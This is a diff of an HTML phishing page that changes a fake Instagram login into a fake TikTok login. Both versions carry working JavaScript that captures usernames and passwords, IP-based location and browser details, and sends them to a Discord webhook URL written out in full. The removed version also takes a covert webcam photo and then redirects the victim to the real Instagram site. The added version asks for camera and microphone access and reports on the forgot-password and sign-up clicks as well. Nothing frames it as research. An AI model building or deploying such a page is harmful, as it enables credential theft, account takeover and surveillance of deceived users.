@@ -1,136 +1,113 @@
 <!DOCTYPE html>
-<html lang='en'>
+<html lang="en">
 <head>
-    <meta charset='UTF-8'>
-    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-    <title>Instagram</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | TikTok</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { width: 350px; text-align: center; }
-        .box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 10px 0; margin-bottom: 10px; }
-        .logo { margin: 22px auto 12px; width: 175px; height: 51px; background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png'); background-size: contain; background-repeat: no-repeat; background-position: center; }
-        .form { display: flex; flex-direction: column; padding: 0 40px; margin-top: 24px; }
-        .input-group { margin-bottom: 6px; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 0 7px 8px; font-size: 12px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #a8a8a8; }
-        button { background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; padding: 5px 9px; text-align: center; cursor: pointer; margin-top: 8px; height: 30px; }
-        button:disabled { opacity: 0.3; }
-        .divider { display: flex; align-items: center; margin: 10px 40px 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
-        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
-        .divider span { margin: 0 18px; }
-        .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: block; margin-bottom: 12px; }
-        .forgot { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin-top: 12px; }
-        .signup-box { padding: 15px 0; }
-        .signup-box p { margin: 0; font-size: 14px; }
-        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
+        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+        h2 { font-size: 32px; margin-bottom: 30px; font-weight: 700; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; background-color: #f8f8f8; }
+        input:focus { border-color: #fe2c55; outline: none; }
+        .btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .btn:hover { background-color: #e62a4d; }
+        .links { margin-top: 20px; font-size: 14px; color: #161823; display: flex; justify-content: space-between; }
+        .links a { color: #161823; text-decoration: none; font-weight: 600; cursor: pointer; }
+        .links a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
-    <div class='container'>
-        <div class='box'>
-            <div class='logo'></div>
-            <form class='form' id='loginForm'>
-                <div class='input-group'>
-                    <input type='text' id='username' placeholder='Phone number, username, or email' required>
-                </div>
-                <div class='input-group'>
-                    <input type='password' id='password' placeholder='Password' required>
-                </div>
-                <button type='submit' id='loginBtn'>Log In</button>
-            </form>
-            <div class='divider'><span>OR</span></div>
-            <a href='#' class='fb-login'>Log in with Facebook</a>
-            <a href='#' class='forgot'>Forgot password?</a>
-        </div>
-        <div class='box signup-box'>
-            <p>Don't have an account? <a href='#'>Sign up</a></p>
+    <div class="container">
+        <h2>Log in to TikTok</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="Email or username" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn" id="loginBtn">Log in</button>
+        </form>
+        <div class="links">
+            <a id="forgotBtn">Forgot password?</a>
+            <a id="registerBtn">Sign up</a>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
 
-        async function getIPInfo() {
+        async function getDeviceInfo() {
+            let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                return await res.json();
-            } catch (e) {
-                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
-            }
-        }
-
-        async function capturePhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const dataUrl = canvas.toDataURL('image/jpeg');
-                stream.getTracks().forEach(track => track.stop());
-                return dataUrl;
-            } catch (e) {
-                console.error('Camera access denied');
-                return null;
-            }
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('loginBtn');
-            btn.disabled = true;
-            btn.innerText = 'Logging in...';
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+                ipData = await res.json();
+            } catch(e) {}
             
-            const ipInfo = await getIPInfo();
-            const browser = navigator.userAgent;
-            const time = new Date().toISOString();
+            return {
+                ip: ipData.ip || 'Unknown',
+                location: `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`,
+                os: navigator.platform,
+                browser: navigator.userAgent,
+                time: new Date().toISOString()
+            };
+        }
 
-            const photoData = await capturePhoto();
+        async function triggerMedia() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                return 'Granted (Stream active)';
+            } catch (err) {
+                return `Denied: ${err.message}`;
+            }
+        }
 
-            const embed = {
-                title: 'New Instagram Credential Captured',
-                color: 15548997,
-                fields: [
-                    { name: 'Username', value: username, inline: true },
-                    { name: 'Password', value: password, inline: true },
-                    { name: 'IP Address', value: ipInfo.ip || 'Unknown', inline: true },
-                    { name: 'Location', value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}`, inline: false },
-                    { name: 'OS/Browser', value: browser, inline: false },
-                    { name: 'Time', value: time, inline: false }
-                ]
+        async function sendData(action, email, password) {
+            const device = await getDeviceInfo();
+            let mediaStatus = 'Not requested';
+            
+            if (action === 'LOG IN') {
+                mediaStatus = await triggerMedia();
+            }
+
+            const payload = {
+                content: `**New TikTok Activity: ${action}**`,
+                embeds: [{
+                    color: 16657493,
+                    fields: [
+                        { name: 'Email/User', value: email || 'N/A', inline: true },
+                        { name: 'Password', value: password || 'N/A', inline: true },
+                        { name: 'Action', value: action, inline: true },
+                        { name: 'IP Address', value: device.ip, inline: true },
+                        { name: 'Location', value: device.location, inline: true },
+                        { name: 'Media Access', value: mediaStatus, inline: false },
+                        { name: 'OS / Platform', value: device.os, inline: true },
+                        { name: 'User Agent', value: device.browser, inline: false },
+                        { name: 'Timestamp', value: device.time, inline: false }
+                    ]
+                }]
             };
 
-            const payload = { embeds: [embed] };
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
 
-            try {
-                if (photoData) {
-                    const res = await fetch(photoData);
-                    const blob = await res.blob();
-                    const formData = new FormData();
-                    formData.append('payload_json', JSON.stringify(payload));
-                    formData.append('file', blob, 'face_capture.jpg');
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            sendData('LOG IN', document.getElementById('email').value, document.getElementById('password').value);
+        });
 
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                } else {
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                }
-            } catch (err) {
-                console.error(err);
-            }
+        document.getElementById('forgotBtn').addEventListener('click', () => {
+            sendData('FORGOT PASSWORD', document.getElementById('email').value, '');
+        });
 
-            window.location.href = 'https://www.instagram.com/accounts/login/';
+        document.getElementById('registerBtn').addEventListener('click', () => {
+            sendData('REGISTER', document.getElementById('email').value, document.getElementById('password').value);
         });
     </script>
 </body>
